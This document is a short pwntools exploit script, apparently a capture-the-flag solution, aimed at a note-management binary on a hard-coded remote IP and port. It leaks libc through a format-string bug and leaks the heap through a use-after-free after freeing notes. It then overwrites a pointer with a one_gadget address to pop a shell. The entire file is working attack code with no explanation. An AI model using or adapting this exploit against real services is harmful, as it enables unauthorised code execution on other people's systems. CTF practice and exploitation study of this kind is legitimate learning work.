from pwn import*
def menu(ch):
	p.sendlineafter('choice >',str(ch))
def show_name(index):
	menu(1)
def new(content):
	menu(2)
	p.sendafter('input note:',content)
def free(index):
	menu(3)
	p.sendlineafter('index>',str(index))
def show():
	menu(4)
def gift(content):
	menu(666)
	p.sendlineafter(':',content)

p = process('./main')
p = remote('47.111.104.99',51504)
libc =ELF('./libc-2.23.so')
p.sendlineafter(':','%11$p')
menu(1)
p.recvuntil('Current user:')
libc_base = int(p.recv(14),16) - libc.sym['__libc_start_main'] - 240
log.info('LIBC:\t' + hex(libc_base))
new('FMYY\n')
new('FMYY'*2*4 + p64(libc_base + 0x4527A) + '\n')
free(1)
free(0)
show()
p.recvuntil('index 1:')
heap_base = u64(p.recv(6).ljust(8,'\x00')) - 0x1C80
log.info('HEAP:\t' + hex(heap_base))
gift('FMYY'*2*4 + p64(heap_base + 0x1C80 + 0x28)[0:7])
p.interactive()
